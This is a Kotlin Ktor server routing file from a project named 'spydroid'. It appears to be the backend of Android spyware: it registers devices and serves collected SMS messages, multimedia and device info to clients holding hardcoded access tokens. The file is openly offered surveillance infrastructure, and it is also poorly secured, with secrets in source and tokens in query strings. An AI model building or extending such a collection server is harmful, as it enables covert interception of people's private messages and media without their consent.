/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.plugins

import io.ktor.http.HttpStatusCode
import io.ktor.server.application.*
import io.ktor.server.request.receiveParameters
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import net.spydroid.server.domain.DevicesRepository
import net.spydroid.server.domain.InfoRepository
import net.spydroid.server.domain.MultimediaRepository
import net.spydroid.server.domain.SmsRepository
import net.spydroid.server.models.DeviceHandler
import org.koin.ktor.ext.inject


private object Routes {
    const val DEVICES = "/devices"
    const val INFO = "/info"
    const val MULTIMEDIA = "/multimedia"
    const val SMS = "/sms"
}

fun Application.configureRouting() {
    val validTokens = setOf("iygad7618wg8y1f7fgvas71f671", "otroTokenValido")

    routing {
        devices(validTokens)
        info(validTokens)
        sms(validTokens)
        multimedia(validTokens)
    }
}

private fun Route.devices(validTokens: Set<String>) {

    val devicesRepository: DevicesRepository by inject()

    get(Routes.DEVICES) {
        val accessToken = call.request.queryParameters["access_token"]
        val devices = devicesRepository.getALlDevices()
        if (accessToken in validTokens) {
            call.respond(devices)
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }

    post(Routes.DEVICES) {
        val params = call.receiveParameters()
        val accessToken = params["access_token"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing access token"
        )
        val alias = params["alias"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing alias"
        )
        val name = params["name"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )
        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                devicesRepository.insert(
                    DeviceHandler(
                        alias = alias,
                        name = name
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                "Device with alias '$alias' and name '$name' was processed successfully!"
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }
}


private fun Route.info(validTokens: Set<String>){

    val infoRepository: InfoRepository by inject()

    get(Routes.INFO) {
        val accessToken = call.request.queryParameters["access_token"]
        val info = infoRepository.getAllInfo()
        if (accessToken in validTokens) {
            call.respond(info)
        }
    }
}

private fun Route.sms(validTokens: Set<String>){

    val smsRepository: SmsRepository by inject()

    get(Routes.SMS) {
        val accessToken = call.request.queryParameters["access_token"]
        val sms = smsRepository.getALlSms()
        if (accessToken in validTokens) {
            call.respond(sms)
        }
    }
}

private fun Route.multimedia(validTokens: Set<String>){

    val multimediaRepository: MultimediaRepository by inject()

    get(Routes.MULTIMEDIA) {
        val accessToken = call.request.queryParameters["access_token"]
        val multimedia = multimediaRepository.getAllMultimedia()
        if (accessToken in validTokens) {
            call.respond(multimedia)
        }
    }
}